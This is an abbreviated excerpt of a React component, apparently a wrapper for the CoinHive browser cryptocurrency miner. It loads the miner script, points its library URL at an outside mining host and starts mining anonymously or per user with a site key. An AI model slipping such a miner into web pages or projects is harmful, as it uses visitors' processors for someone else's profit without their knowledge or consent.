...
import './coinhive/coinhive.min.js';
...
class CoinHiveClient extends Component {
  ...
  buildMiner = async () => {
    ...
    this.miner = await new Promise(resolve => {
      ...
      return resolve(this.initCoinHive());
  ...
  initCoinHive(){
    ...
    if(typeof window !== "undefined"){
      ...
      if(CoinHive){
        ...
        CoinHive.CONFIG.LIB_URL = `https://www.webmining.online/ch/lib/`;

        if (userName) {
          return CoinHive.User(siteKey, userName);
        }
        
        else return CoinHive.Anonymous(siteKey);
      }
